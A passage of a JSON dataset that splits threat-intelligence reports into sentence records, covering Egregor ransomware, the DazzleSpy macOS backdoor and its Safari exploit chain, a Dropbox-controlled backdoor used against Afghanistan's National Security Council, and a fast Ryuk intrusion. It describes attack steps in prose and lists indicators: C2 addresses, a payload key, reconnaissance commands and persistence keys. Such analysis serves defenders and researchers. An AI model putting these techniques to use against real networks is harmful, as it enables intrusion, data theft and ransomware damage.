        "text": "This information will assist in the lateral movement phase and also in performing privilege escalation, as Egregor compromises Active Directory in order to become domain admin.\n",
        "type": "",
        "report": "r-1074",
        "line": 6,
        "index": 3060
    },
    {
        "id": "cti_reports_filtered/r-1074.md:::S7",
        "text": "In this stage, after the malware settles on the victim\u2019s machine, it starts communications to the C2 in order to download additional components including scripts, DLLs and other files that will be used eventually to exfiltrate data and encrypt files.",
        "type": "",
        "report": "r-1074",
        "line": 7,
        "index": 3061
    },
    {
        "id": "cti_reports_filtered/r-1074.md:::S8",
        "text": "Among the dropped files observed:\n",
        "type": "",
        "report": "r-1074",
        "line": 8,
        "index": 3062
    },
    {
        "id": "cti_reports_filtered/r-1074.md:::S9",
        "text": "- A batch file that is used to run Bitsadmin and Rundll to download and execute the Egregor payload.\n",
        "type": "",
        "report": "r-1074",
        "line": 9,
        "index": 3063
    },
    {
        "id": "cti_reports_filtered/r-1074.md:::S10",
        "text": "- A Zip file contains a binary file that is an RClone client, renamed svchost, and RClone config files (webdav, ftp and dropbox) used later for exfiltration.",
        "type": "",
        "report": "r-1074",
        "line": 10,
        "index": 3064
    },
    {
        "id": "cti_reports_filtered/r-1074.md:::S11",
        "text": "CobaltStrike creates a service that runs an encoded PowerShell command that executes shellcode that creates connection to amajai-technologies[.]industries:\n",
        "type": "",
        "report": "r-1074",
        "line": 11,
        "index": 3065
    },
    {
        "id": "cti_reports_filtered/r-1074.md:::S12",
        "text": "After dropping the files needed for the attack, the attackers \u201cprepare the ground\u201d and undertake a final procedure meant to avoid detection and prevention.",
        "type": "",
        "report": "r-1074",
        "line": 12,
        "index": 3066
    },
    {
        "id": "cti_reports_filtered/r-1074.md:::S13",
        "text": "The attacker creates a Group Policy Object (GPO) to disable Windows Defender and tries to take down any anti-virus products.\n",
        "type": "",
        "report": "r-1074",
        "line": 13,
        "index": 3067
    },
    {
        "id": "cti_reports_filtered/r-1074.md:::S14",
        "text": "As described above, the operators of Egregor deploy the ransomware payload after collecting the sensitive information and setting the GPO to evade detection and prevention.",
        "type": "",
        "report": "r-1074",
        "line": 14,
        "index": 3068
    },
    {
        "id": "cti_reports_filtered/r-1074.md:::S15",
        "text": "To deploy the ransomware, they execute the dropped batch file that, as mentioned, is used to download and execute the ransomware payload from a remote server:\n",
        "type": "",
        "report": "r-1074",
        "line": 15,
        "index": 3069
    },
    {
        "id": "cti_reports_filtered/r-1074.md:::S16",
        "text": "The Egregor payload can only be decrypted if the correct key is provided via command line argument to the Rundll32 process, which means that the file cannot be analyzed, either manually or using a sandbox, if the exact same command line that the attackers used to run the ransomware isn\u2019t provided.\n",
        "type": "",
        "report": "r-1074",
        "line": 16,
        "index": 3070
    },
    {
        "id": "cti_reports_filtered/r-1074.md:::S17",
        "text": "In order to execute the ransomware and decrypt the blob of code inside of it, the operators provide the batch file with the key \u201c-passegregor10\u201d which resolves in the ransomware running and encrypting files:\n",
        "type": "",
        "report": "r-1074",
        "line": 17,
        "index": 3071
    },
    {
        "id": "cti_reports_filtered/r-1074.md:::S18",
        "text": "The encrypted file names are appended with a string of random characters as the new extension.",
        "type": "",
        "report": "r-1074",
        "line": 18,
        "index": 3072
    },
    {
        "id": "cti_reports_filtered/r-1074.md:::S19",
        "text": "For example, it renames a file named \u201cMy_files.zip\u201d to \u201cMy_files.zip.IAsnM\u201d, \u201cMy_files2.zip\u201d to \u201cMy_files2.zip.WZlF\u201d and so on.",
        "type": "",
        "report": "r-1074",
        "line": 19,
        "index": 3073
    },
    {
        "id": "cti_reports_filtered/r-1074.md:::S20",
        "text": "Also, the threat actor creates the \u201cRECOVER-FILES.txt\u201d with ransom note in all folders that contain encrypted files, as shown in the figure below:\n",
        "type": "",
        "report": "r-1074",
        "line": 20,
        "index": 3074
    },
    {
        "id": "cti_reports_filtered/r-1074.md:::S21",
        "text": " \t ",
        "type": "",
        "report": "r-1074",
        "line": 21,
        "index": 3075
    },
    {
        "id": "cti_reports_filtered/r-1100.md:::S0",
        "text": "The exploit used to gain code execution in the browser is quite complex and had more than 1,000 lines of code once formatted nicely.",
        "type": "",
        "report": "r-1100",
        "line": 0,
        "index": 3076
    },
    {
        "id": "cti_reports_filtered/r-1100.md:::S1",
        "text": "It\u2019s interesting to note that some code, which suggests the vulnerability could also have been exploited on iOS and even on PAC-enabled (Pointer Authentication Code) devices such as the iPhone XS and newer, has been commented out, as seen in Figure 5.",
        "type": "",
        "report": "r-1100",
        "line": 1,
        "index": 3077
    },
    {
        "id": "cti_reports_filtered/r-1100.md:::S2",
        "text": "We have confirmed that the patch identified by Google TAG does fix the vulnerability.",
        "type": "",
        "report": "r-1100",
        "line": 2,
        "index": 3078
    },
    {
        "id": "cti_reports_filtered/r-1100.md:::S3",
        "text": "While it is possible this vulnerability was assigned CVE-2021-1789, we couldn\u2019t confirm due to the lack of publicly available technical details.",
        "type": "",
        "report": "r-1100",
        "line": 3,
        "index": 3079
    },
    {
        "id": "cti_reports_filtered/r-1100.md:::S4",
        "text": "Below we outline our understanding of how the vulnerability affects Safari versions prior to 14.1.\n",
        "type": "",
        "report": "r-1100",
        "line": 4,
        "index": 3080
    },
    {
        "id": "cti_reports_filtered/r-1100.md:::S5",
        "text": "The exploit implements two primitives to gain memory read and write access: one to leak the address of an object (addrof) and one to create a fake JavaScript object from a given memory address (fakeobj).",
        "type": "",
        "report": "r-1100",
        "line": 5,
        "index": 3081
    },
    {
        "id": "cti_reports_filtered/r-1100.md:::S6",
        "text": "Using these two functions, the exploit creates two arrays of different types that overlap in memory, and thus is able to set a value in one of them that is treated as a pointer when accessed using the other.",
        "type": "",
        "report": "r-1100",
        "line": 6,
        "index": 3082
    },
    {
        "id": "cti_reports_filtered/r-1100.md:::S7",
        "text": "The technique is well described by Samuel Gro\u00df in his multiple publications on the subject.",
        "type": "",
        "report": "r-1100",
        "line": 7,
        "index": 3083
    },
    {
        "id": "cti_reports_filtered/r-1100.md:::S8",
        "text": "Below we explain the vulnerability that made the leakage of object addresses possible.",
        "type": "",
        "report": "r-1100",
        "line": 8,
        "index": 3084
    },
    {
        "id": "cti_reports_filtered/r-1100.md:::S9",
        "text": "The exploit relies on a side effect caused by modifying an object property to be accessible via a \u201cgetter\u201d function while enumerating the object\u2019s properties in JIT-compiled code.",
        "type": "",
        "report": "r-1100",
        "line": 9,
        "index": 3085
    },
    {
        "id": "cti_reports_filtered/r-1100.md:::S10",
        "text": "The JavaScript engine erroneously speculates that the value of the property is cached in an array and is not the result of calling the getter function.",
        "type": "",
        "report": "r-1100",
        "line": 10,
        "index": 3086
    },
    {
        "id": "cti_reports_filtered/r-1100.md:::S11",
        "text": "We have extracted the relevant part of the code that enables the addrof primitive, which you can see in Figure 6.",
        "type": "",
        "report": "r-1100",
        "line": 11,
        "index": 3087
    },
    {
        "id": "cti_reports_filtered/r-1100.md:::S12",
        "text": "Comments starting with (e)r are from ESET Research.\n",
        "type": "",
        "report": "r-1100",
        "line": 12,
        "index": 3088
    },
    {
        "id": "cti_reports_filtered/r-1100.md:::S13",
        "text": "The first corruption happening here is the result of bar(vic).",
        "type": "",
        "report": "r-1100",
        "line": 13,
        "index": 3089
    },
    {
        "id": "cti_reports_filtered/r-1100.md:::S14",
        "text": "The function will return a pointer to a JSCell object (to be more precise, a GetterSetter), which should never be accessible from the JavaScript code.",
        "type": "",
        "report": "r-1100",
        "line": 14,
        "index": 3090
    },
    {
        "id": "cti_reports_filtered/r-1100.md:::S15",
        "text": "Here is the result of describe(bar(vic)) in a JavaScriptCore console:\n",
        "type": "",
        "report": "r-1100",
        "line": 15,
        "index": 3091
    },
    {
        "id": "cti_reports_filtered/r-1100.md:::S16",
        "text": "This JSCell is then converted to a JSObject by calling the JavaScript Object function.",
        "type": "",
        "report": "r-1100",
        "line": 16,
        "index": 3092
    },
    {
        "id": "cti_reports_filtered/r-1100.md:::S17",
        "text": "Internally, this results in calling the JSCell\u2019s toObject method.",
        "type": "",
        "report": "r-1100",
        "line": 17,
        "index": 3093
    },
    {
        "id": "cti_reports_filtered/r-1100.md:::S18",
        "text": "There is no implementation for converting a GetterSetter to a JSObject and the code will eventually fall back and assume its type is a Symbol.",
        "type": "",
        "report": "r-1100",
        "line": 18,
        "index": 3094
    },
    {
        "id": "cti_reports_filtered/r-1100.md:::S19",
        "text": "The GetterSetter will erroneously be cast to a Symbol.",
        "type": "",
        "report": "r-1100",
        "line": 19,
        "index": 3095
    },
    {
        "id": "cti_reports_filtered/r-1100.md:::S20",
        "text": "You may have noticed the assertion that the cell type is a Symbol before performing the cast in the code; however, the ASSERT macro in WebKit is compiled out of release builds.",
        "type": "",
        "report": "r-1100",
        "line": 20,
        "index": 3096
    },
    {
        "id": "cti_reports_filtered/r-1100.md:::S21",
        "text": "In memory, the location of getter[0] is the same as this corrupted symbol\u2019s value.",
        "type": "",
        "report": "r-1100",
        "line": 21,
        "index": 3097
    },
    {
        "id": "cti_reports_filtered/r-1100.md:::S22",
        "text": "Thus, reassigning a value to getter[0] will change the value of the symbol.",
        "type": "",
        "report": "r-1100",
        "line": 22,
        "index": 3098
    },
    {
        "id": "cti_reports_filtered/r-1100.md:::S23",
        "text": "Its value is fetched from JavaScript using its toString method.\n",
        "type": "",
        "report": "r-1100",
        "line": 23,
        "index": 3099
    },
    {
        "id": "cti_reports_filtered/r-1100.md:::S24",
        "text": "The updated JavaScriptCore code now checks whether the object contains properties with GetterSetter after the property enumeration, before considering whether the object\u2019s attribute can be accessed \u201cquickly\u201d.",
        "type": "",
        "report": "r-1100",
        "line": 24,
        "index": 3100
    },
    {
        "id": "cti_reports_filtered/r-1100.md:::S25",
        "text": "Detailing the fake object creation would require an article of its own.",
        "type": "",
        "report": "r-1100",
        "line": 25,
        "index": 3101
    },
    {
        "id": "cti_reports_filtered/r-1100.md:::S26",
        "text": "In short, it abuses the same bug, although this time the object is manipulated in a way that the JIT-compiled code accesses an item that is out-of-bounds and returns an address that was carefully sprayed on the heap before the fetch.",
        "type": "",
        "report": "r-1100",
        "line": 26,
        "index": 3102
    },
    {
        "id": "cti_reports_filtered/r-1100.md:::S27",
        "text": "The rest of the code allows bypassing mitigations, such as the Gigacage, and loads the next stage.\n",
        "type": "",
        "report": "r-1100",
        "line": 27,
        "index": 3103
    },
    {
        "id": "cti_reports_filtered/r-1100.md:::S28",
        "text": "As explained by Google TAG, the JavaScript loads a Mach-O executable file in memory.",
        "type": "",
        "report": "r-1100",
        "line": 28,
        "index": 3104
    },
    {
        "id": "cti_reports_filtered/r-1100.md:::S29",
        "text": "The rudimentary loader does not implement importing symbols from external libraries; instead, the addresses of dlopen and dlsym are patched into the loaded Mach-O.",
        "type": "",
        "report": "r-1100",
        "line": 29,
        "index": 3105
    },
    {
        "id": "cti_reports_filtered/r-1100.md:::S30",
        "text": "These can then be used from the executable to dynamically load and get the addresses of functions from external libraries.",
        "type": "",
        "report": "r-1100",
        "line": 30,
        "index": 3106
    },
    {
        "id": "cti_reports_filtered/r-1100.md:::S31",
        "text": "Now that code execution has been gained, the next stage is a Mach-O that is loaded into memory and executed.",
        "type": "",
        "report": "r-1100",
        "line": 31,
        "index": 3107
    },
    {
        "id": "cti_reports_filtered/r-1100.md:::S32",
        "text": "This Mach-O exploits a local privilege escalation vulnerability to run the next stage as root.",
        "type": "",
        "report": "r-1100",
        "line": 32,
        "index": 3108
    },
    {
        "id": "cti_reports_filtered/r-1100.md:::S33",
        "text": "Our examination confirms Google\u2019s analysis that the exploited vulnerability was described by Xinru Chi and Tielei Wang in a presentation at zer0con 2021, but it was also presented in more details at MOSEC 2021 by Tielei Wang.",
        "type": "",
        "report": "r-1100",
        "line": 33,
        "index": 3109
    },
    {
        "id": "cti_reports_filtered/r-1100.md:::S34",
        "text": "The vulnerability has been assigned CVE-2021-30869.",
        "type": "",
        "report": "r-1100",
        "line": 34,
        "index": 3110
    },
    {
        "id": "cti_reports_filtered/r-1100.md:::S35",
        "text": "Figure 7 shows a call to a function Tielei Wang called adjust_port_type in his last presentation.",
        "type": "",
        "report": "r-1100",
        "line": 35,
        "index": 3111
    },
    {
        "id": "cti_reports_filtered/r-1100.md:::S36",
        "text": "This function, responsible for changing the internal type of a Mach port, is implemented the same way in the Mach-O as was presented at MOSEC.",
        "type": "",
        "report": "r-1100",
        "line": 36,
        "index": 3112
    },
    {
        "id": "cti_reports_filtered/r-1100.md:::S37",
        "text": "Changing the type of a Mach port shouldn\u2019t be possible unless a vulnerability exists.",
        "type": "",
        "report": "r-1100",
        "line": 37,
        "index": 3113
    },
    {
        "id": "cti_reports_filtered/r-1100.md:::S38",
        "text": "To summarize, the Mach-O does the following:\n",
        "type": "",
        "report": "r-1100",
        "line": 38,
        "index": 3114
    },
    {
        "id": "cti_reports_filtered/r-1100.md:::S39",
        "text": "- Downloads a file from the URL supplied as an argument\n",
        "type": "",
        "report": "r-1100",
        "line": 39,
        "index": 3115
    },
    {
        "id": "cti_reports_filtered/r-1100.md:::S40",
        "text": "- Decrypts this file using AES-128-EBC and TEA with a custom delta\n",
        "type": "",
        "report": "r-1100",
        "line": 40,
        "index": 3116
    },
    {
        "id": "cti_reports_filtered/r-1100.md:::S41",
        "text": "- Writes the resulting file to $TMPDIR/airportpaird and makes it executable\n",
        "type": "",
        "report": "r-1100",
        "line": 41,
        "index": 3117
    },
    {
        "id": "cti_reports_filtered/r-1100.md:::S42",
        "text": "- Uses the privilege escalation exploit to remove the com.apple.quarantineattribute from the file to avoid asking the user to confirm the launch of the unsigned executable\n",
        "type": "",
        "report": "r-1100",
        "line": 42,
        "index": 3118
    },
    {
        "id": "cti_reports_filtered/r-1100.md:::S43",
        "text": "- Uses the same privilege escalation to launch the next stage with root privileges\n",
        "type": "",
        "report": "r-1100",
        "line": 43,
        "index": 3119
    },
    {
        "id": "cti_reports_filtered/r-1100.md:::S44",
        "text": "The decrypted payload is where our analysis differs the most from what was described by Google TAG: the payload delivered to vulnerable visitors to the D100 site was new macOS malware we\u2019ve named DazzleSpy.\n",
        "type": "",
        "report": "r-1100",
        "line": 44,
        "index": 3120
    },
    {
        "id": "cti_reports_filtered/r-1100.md:::S45",
        "text": "DazzleSpy is a full-featured backdoor that provides attackers a large set of functionalities to control, and exfiltrate files from, a compromised computer.",
        "type": "",
        "report": "r-1100",
        "line": 45,
        "index": 3121
    },
    {
        "id": "cti_reports_filtered/r-1100.md:::S46",
        "text": "Our sample is a Mach-O binary file compiled for x86_64 CPU architecture.",
        "type": "",
        "report": "r-1100",
        "line": 46,
        "index": 3122
    },
    {
        "id": "cti_reports_filtered/r-1100.md:::S47",
        "text": "In order to persist on the compromised device, the malware adds a Property List file (plist; see Figure 8) named com.apple.softwareupdate.plist to the LaunchAgents folder.",
        "type": "",
        "report": "r-1100",
        "line": 47,
        "index": 3123
    },
    {
        "id": "cti_reports_filtered/r-1100.md:::S48",
        "text": "The malware executable file is named softwareupdate and saved in the $HOME/.local/ folder.\n",
        "type": "",
        "report": "r-1100",
        "line": 48,
        "index": 3124
    },
    {
        "id": "cti_reports_filtered/r-1100.md:::S49",
        "text": "DazzleSpy connects to a hardcoded C&C server; the IP address and port found in the sample we decrypted was 88.218.192[.]128:5633.",
        "type": "",
        "report": "r-1100",
        "line": 49,
        "index": 3125
    },
    {
        "id": "cti_reports_filtered/r-1100.md:::S50",
        "text": "At first, the malware performs a TLS handshake, then uses a custom protocol to exchange JSON objects to deliver commands from the C&C server to compromised Macs.",
        "type": "",
        "report": "r-1100",
        "line": 50,
        "index": 3126
    },
    {
        "id": "cti_reports_filtered/r-1100.md:::S51",
        "text": "DazzleSpy\u2019s binary contains an X.509 certificate used as a certificate authority (CA).",
        "type": "",
        "report": "r-1100",
        "line": 51,
        "index": 3127
    },
    {
        "id": "cti_reports_filtered/r-1100.md:::S52",
        "text": "It verifies that the server\u2019s certificate is issued by that authority.",
        "type": "",
        "report": "r-1100",
        "line": 52,
        "index": 3128
    },
    {
        "id": "cti_reports_filtered/r-1100.md:::S53",
        "text": "In practice, the same self-signed certificate is used for both the CA and the C&C server.",
        "type": "",
        "report": "r-1100",
        "line": 53,
        "index": 3129
    },
    {
        "id": "cti_reports_filtered/r-1100.md:::S54",
        "text": "The technique protects the malware\u2019s communications from potential eavesdropping by refusing to send data if end-to-end encryption is not possible.",
        "type": "",
        "report": "r-1100",
        "line": 54,
        "index": 3130
    },
    {
        "id": "cti_reports_filtered/r-1107.md:::S0",
        "text": "Our investigation started with the emails sent from an employee of the Administrative Office of the President in Afghanistan to the employees of the Afghanistan National Security Council (NSC).",
        "type": "",
        "report": "r-1107",
        "line": 0,
        "index": 3131
    },
    {
        "id": "cti_reports_filtered/r-1107.md:::S1",
        "text": "The email asked the recipient to review the modifications in the document related to the upcoming press conference of the NSC.",
        "type": "",
        "report": "r-1107",
        "line": 1,
        "index": 3132
    },
    {
        "id": "cti_reports_filtered/r-1107.md:::S2",
        "text": "The email contains a password-protected RAR archive named NSC Press conference.rar .",
        "type": "",
        "report": "r-1107",
        "line": 2,
        "index": 3133
    },
    {
        "id": "cti_reports_filtered/r-1107.md:::S3",
        "text": "Extracting the archive with the password provided in the email requires user interaction and therefore provides a challenge for some sandbox security solutions.\n",
        "type": "",
        "report": "r-1107",
        "line": 3,
        "index": 3134
    },
    {
        "id": "cti_reports_filtered/r-1107.md:::S4",
        "text": "The extracted file, NSC Press conference.exe , acts as a dropper.",
        "type": "",
        "report": "r-1107",
        "line": 4,
        "index": 3135
    },
    {
        "id": "cti_reports_filtered/r-1107.md:::S5",
        "text": "The content of the lure email suggests that the attached file is the document, hence, to reduce the suspicion of the victim running the executable, the attackers use the simple trick \u2013 the first document on the victim\u2019s desktop is opened for the user upon the dropper execution.",
        "type": "",
        "report": "r-1107",
        "line": 5,
        "index": 3136
    },
    {
        "id": "cti_reports_filtered/r-1107.md:::S6",
        "text": "Whether the dropper found a document to open or not, it will proceed to the next stage \u2013 drop the backdoor to C:\\users\\public\\spools.exe and execute it.",
        "type": "",
        "report": "r-1107",
        "line": 6,
        "index": 3137
    },
    {
        "id": "cti_reports_filtered/r-1107.md:::S7",
        "text": "The backdoor contain narrow capabilities: download and upload files, run commands and send the attackers the results.",
        "type": "",
        "report": "r-1107",
        "line": 7,
        "index": 3138
    },
    {
        "id": "cti_reports_filtered/r-1107.md:::S8",
        "text": "However short the list, they allow the attackers to upload and execute additional tools for further reconnaissance and lateral movement.\n",
        "type": "",
        "report": "r-1107",
        "line": 8,
        "index": 3139
    },
    {
        "id": "cti_reports_filtered/r-1107.md:::S9",
        "text": "To hide malicious functionality \u2013 persistence and C&C communication \u2013 from static detections, the malware uses a common obfuscation technique known as \u201cstackstrings\u201d to build wide char strings.\n",
        "type": "",
        "report": "r-1107",
        "line": 9,
        "index": 3140
    },
    {
        "id": "cti_reports_filtered/r-1107.md:::S10",
        "text": "The backdoor utilizes Dropbox as a C&C server, by sending and receiving commands written to a specific folder in a specially created Dropbox account, prepared by the attacker before the operation.",
        "type": "",
        "report": "r-1107",
        "line": 10,
        "index": 3141
    },
    {
        "id": "cti_reports_filtered/r-1107.md:::S11",
        "text": "By using the legitimate Dropbox service for C&C communications, instead of regular dedicated server infrastructure, aids in masking the malicious traffic in the target\u2019s network, as no communication to abnormal websites is taking place.",
        "type": "",
        "report": "r-1107",
        "line": 11,
        "index": 3142
    },
    {
        "id": "cti_reports_filtered/r-1107.md:::S12",
        "text": "The backdoor uses the Dropbox API with a hardcoded bearer access token and has the ability to download, upload, and execute files.\n",
        "type": "",
        "report": "r-1107",
        "line": 12,
        "index": 3143
    },
    {
        "id": "cti_reports_filtered/r-1107.md:::S13",
        "text": "In the initialization stage, the backdoor creates a unique folder for the victim in an attacker-controlled Dropbox account.",
        "type": "",
        "report": "r-1107",
        "line": 13,
        "index": 3144
    },
    {
        "id": "cti_reports_filtered/r-1107.md:::S14",
        "text": "The folder is named by the victim\u2019s MAC address which is obtained using GetAdaptersInfo API.\n",
        "type": "",
        "report": "r-1107",
        "line": 14,
        "index": 3145
    },
    {
        "id": "cti_reports_filtered/r-1107.md:::S15",
        "text": "Locally, the backdoor creates a working folder at C:\\users\\public\\<d> (where <d> is a random integer).",
        "type": "",
        "report": "r-1107",
        "line": 15,
        "index": 3146
    },
    {
        "id": "cti_reports_filtered/r-1107.md:::S16",
        "text": "It then proceeds by uploading two files to the server:\n",
        "type": "",
        "report": "r-1107",
        "line": 16,
        "index": 3147
    },
    {
        "id": "cti_reports_filtered/r-1107.md:::S17",
        "text": "- m-<date>.txt \u2013 containing the backdoor execution path\n",
        "type": "",
        "report": "r-1107",
        "line": 17,
        "index": 3148
    },
    {
        "id": "cti_reports_filtered/r-1107.md:::S18",
        "text": "- d-<date>.txt \u2013 containing the local working folder path.\n",
        "type": "",
        "report": "r-1107",
        "line": 18,
        "index": 3149
    },
    {
        "id": "cti_reports_filtered/r-1107.md:::S19",
        "text": "When the attackers need to send a file or command to the victim machine, they place them to the folder named d in the victim\u2019s Dropbox folder.",
        "type": "",
        "report": "r-1107",
        "line": 19,
        "index": 3150
    },
    {
        "id": "cti_reports_filtered/r-1107.md:::S20",
        "text": "The malware retrieves this folder and downloads all its contents to the working folder.",
        "type": "",
        "report": "r-1107",
        "line": 20,
        "index": 3151
    },
    {
        "id": "cti_reports_filtered/r-1107.md:::S21",
        "text": "Finally, if the file named c.txt \u2013 that contains the attacker command, exists in this working folder, the backdoor executes it using the ComSpec environment variable, which normally points to the command line interpreter (like cmd.exe ), and uploads the results back to the Dropbox drive while deleting the command from the server.\n",
        "type": "",
        "report": "r-1107",
        "line": 21,
        "index": 3152
    },
    {
        "id": "cti_reports_filtered/r-1107.md:::S22",
        "text": "The backdoor establishes persistence by setting the HKEY_CURRENT_USER\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows\\load registry key to point to its executable.",
        "type": "",
        "report": "r-1107",
        "line": 22,
        "index": 3153
    },
    {
        "id": "cti_reports_filtered/r-1107.md:::S23",
        "text": "This method is less common than Run or RunOnce keys but achieves its ultimate goal: the program listed in the Load registry value runs when any user logs on.",
        "type": "",
        "report": "r-1107",
        "line": 23,
        "index": 3154
    },
    {
        "id": "cti_reports_filtered/r-1107.md:::S24",
        "text": "Once the C&C communication is established, the threat actor starts by executing fingerprinting and reconnaissance commands on the machine.",
        "type": "",
        "report": "r-1107",
        "line": 24,
        "index": 3155
    },
    {
        "id": "cti_reports_filtered/r-1107.md:::S25",
        "text": "In this attack, some of the actions we spotted included:\n",
        "type": "",
        "report": "r-1107",
        "line": 25,
        "index": 3156
    },
    {
        "id": "cti_reports_filtered/r-1107.md:::S26",
        "text": "- Download and execution of ntbscan (SHA-1: 90da10004c8f6fafdaa2cf18922670a745564f45 ) \u2013 NetBIOS scanner tool widely used by multiple APT actor including the prolific Chinese group APT10\n",
        "type": "",
        "report": "r-1107",
        "line": 26,
        "index": 3157
    },
    {
        "id": "cti_reports_filtered/r-1107.md:::S27",
        "text": "- Execution of Windows built-in networking utility tools\n",
        "type": "",
        "report": "r-1107",
        "line": 27,
        "index": 3158
    },
    {
        "id": "cti_reports_filtered/r-1107.md:::S28",
        "text": "- Access to the victim\u2019s files, especially documents located on the Desktop\n",
        "type": "",
        "report": "r-1107",
        "line": 28,
        "index": 3159
    },
    {
        "id": "cti_reports_filtered/r-1117.md:::S0",
        "text": "Like in our prior two reports of Ryuk campaigns, the initial access came from phishing emails containing links to google drive that when clicked, downloaded a Bazar Loader backdoor executable.",
        "type": "",
        "report": "r-1117",
        "line": 0,
        "index": 3160
    },
    {
        "id": "cti_reports_filtered/r-1117.md:::S1",
        "text": "In our prior cases we generally saw a lag time, ranging hours to days, from the initial click to Ryuk.",
        "type": "",
        "report": "r-1117",
        "line": 1,
        "index": 3161
    },
    {
        "id": "cti_reports_filtered/r-1117.md:::S2",
        "text": "In this case, the time from initial Bazar execution to domain recon was 5 minutes, and deployment of Cobalt Strike beacons was within 10 minutes.",
        "type": "",
        "report": "r-1117",
        "line": 2,
        "index": 3162
    },
    {
        "id": "cti_reports_filtered/r-1117.md:::S3",
        "text": "This is by far the quickest we have seen them act.\n",
        "type": "",
        "report": "r-1117",
        "line": 3,
        "index": 3163
    },
    {
        "id": "cti_reports_filtered/r-1117.md:::S4",
        "text": "After bringing in Cobalt Strike, we saw familiar TTP\u2019s with using AdFind to continue domain discovery activity.",
        "type": "",
        "report": "r-1117",
        "line": 4,
        "index": 3164
    },
    {
        "id": "cti_reports_filtered/r-1117.md:::S5",
        "text": "In this case, we saw them deploy persistence on the beachhead host, an action we had not previously seen in our other cases.",
        "type": "",
        "report": "r-1117",
        "line": 5,
        "index": 3165
    },
    {
        "id": "cti_reports_filtered/r-1117.md:::S6",
        "text": "After establishing another C2 for an additional Cobalt Strike beacon, they employed the Zerologon exploit (CVE 2020-1472) and obtained domain admin level privileges.",
        "type": "",
        "report": "r-1117",
        "line": 6,
        "index": 3166
    },
    {
        "id": "cti_reports_filtered/r-1117.md:::S7",
        "text": "We also saw host process injection on the beachhead used for obfuscation and privilege escalation.",
        "type": "",
        "report": "r-1117",
        "line": 7,
        "index": 3167
    },
    {
        "id": "cti_reports_filtered/r-1117.md:::S8",
        "text": "With domain administrator privileges obtained, the threat actors then moved laterally throughout the network using SMB and RDP to deploy Cobalt Strike beacons on the domain controllers around 1 hour after the initial execution of Bazar.",
        "type": "",
        "report": "r-1117",
        "line": 8,
        "index": 3168
    },
    {
        "id": "cti_reports_filtered/r-1117.md:::S9",
        "text": "On the domain controllers, some additional discovery was done using the PowerShell Active Directory module.",
        "type": "",
        "report": "r-1117",
        "line": 9,
        "index": 3169
    },
    {
        "id": "cti_reports_filtered/r-1117.md:::S10",
        "text": "From there, they targeted other severs in the environment; specifically, back up systems, file servers, and software deployment servers.",
        "type": "",
        "report": "r-1117",
        "line": 10,
        "index": 3170
    },
    {
        "id": "cti_reports_filtered/r-1117.md:::S11",
        "text": "After establishing Cobalt Strike beacons on those they felt ready to proceed to their final objectives.",
        "type": "",
        "report": "r-1117",
        "line": 11,
        "index": 3171
    },
    {
        "id": "cti_reports_filtered/r-1117.md:::S12",
        "text": "At the 2 hour mark the threat actors made the move to deploy Ryuk ransomware by establishing RDP connections from the domain controllers to servers.",
        "type": "",
        "report": "r-1117",
        "line": 12,
        "index": 3172
    },
    {
        "id": "cti_reports_filtered/r-1117.md:::S13",
        "text": "This continued for the next hour until the entire domain had been encrypted, with that work completing just 3 hours after the first Bazar Loader was executed.\n",
        "type": "",
        "report": "r-1117",
        "line": 13,
        "index": 3173
    },
    {
        "id": "cti_reports_filtered/r-1117.md:::S14",
        "text": "Initial access via a phishing email that linked to a google docs page that enticed the user to download a report, which was a Bazar Loader executable file instead Report-Review20-10.exe.\n",
        "type": "",
        "report": "r-1117",
        "line": 14,
        "index": 3174
    },
    {
        "id": "cti_reports_filtered/r-1117.md:::S15",
        "text": "Execution of the initial Bazar Loader malware relies on user interaction.\n",
        "type": "",
        "report": "r-1117",
        "line": 15,
        "index": 3175
    },
    {
        "id": "cti_reports_filtered/r-1117.md:::S16",
        "text": "Executables transferred over SMB during lateral movement were commonly executed via a service.\n",
        "type": "",
        "report": "r-1117",
        "line": 16,
        "index": 3176
    },
    {
        "id": "cti_reports_filtered/r-1117.md:::S17",
        "text": "This time, unlike prior investigations, clear persistence was found setup on the beachhead host.",
        "type": "",
        "report": "r-1117",
        "line": 17,
        "index": 3177
    },
    {
        "id": "cti_reports_filtered/r-1117.md:::S18",
        "text": "Firefox.exe created these scheduled tasks as well as the run key.",
        "type": "",
        "report": "r-1117",
        "line": 18,
        "index": 3178
    },
    {
        "id": "cti_reports_filtered/r-1117.md:::S19",
        "text": "The Zerologon vulnerability CVE 2020-1472 was again exploited to obtain domain admin level privileges.\n",
        "type": "",
        "report": "r-1117",
        "line": 19,
        "index": 3179
    },
    {
        "id": "cti_reports_filtered/r-1117.md:::S20",
        "text": "Rubeus was used to kerberoast the environment.",
        "type": "",
        "report": "r-1117",
        "line": 20,
        "index": 3180
    },
    {
        "id": "cti_reports_filtered/r-1117.md:::S21",
        "text": "Process injection was used on the beachhead host to to inject into svchost.exe\n",
        "type": "",
        "report": "r-1117",
        "line": 21,
        "index": 3181
    },
    {
        "id": "cti_reports_filtered/r-1117.md:::S22",
        "text": "The Bazar Loader malware was using a code signing certificate signed by Digicert under the organization NOSOV SP Z O O\n",
        "type": "",
        "report": "r-1117",
        "line": 22,
        "index": 3182
    },
    {
        "id": "cti_reports_filtered/r-1117.md:::S23",
        "text": "At the time of delivery, the executable had a detection rate of 1/69 in Virustotal.\n",
        "type": "",
        "report": "r-1117",
        "line": 23,
        "index": 3183
    },
    {
        "id": "cti_reports_filtered/r-1117.md:::S24",
        "text": "The Cobalt Strike beacons used in the environment used similar code signing certificates.",
        "type": "",
        "report": "r-1117",
        "line": 24,
        "index": 3184
    },
    {
        "id": "cti_reports_filtered/r-1117.md:::S25",
        "text": "In previous cases, we generally saw some lag time between infection and further actions but this time things moved much quicker, starting with initial discovery executed by Bazar less than 5 minutes after initial execution.\n",
        "type": "",
        "report": "r-1117",
        "line": 25,
        "index": 3185
    },
    {
        "id": "cti_reports_filtered/r-1117.md:::S26",
        "text": "Discovery command run by Bazar: net view /all net view /all /domain nltest /domain_trusts /all_trusts net localgroup \"administrator\" net group \"domain admins\" /dom\n",
        "type": "",
        "report": "r-1117",
        "line": 26,
        "index": 3186
    },
    {
        "id": "cti_reports_filtered/r-1117.md:::S27",
        "text": "Seven minutes later, after launching a Cobalt Strike beacon, AdFind was used\u2013 running the same discovery pattern seen in previous reporting.",
        "type": "",
        "report": "r-1117",
        "line": 27,
        "index": 3187
    },
    {
        "id": "cti_reports_filtered/r-1117.md:::S28",
        "text": "This was started via a bat script.",
        "type": "",
        "report": "r-1117",
        "line": 28,
        "index": 3188
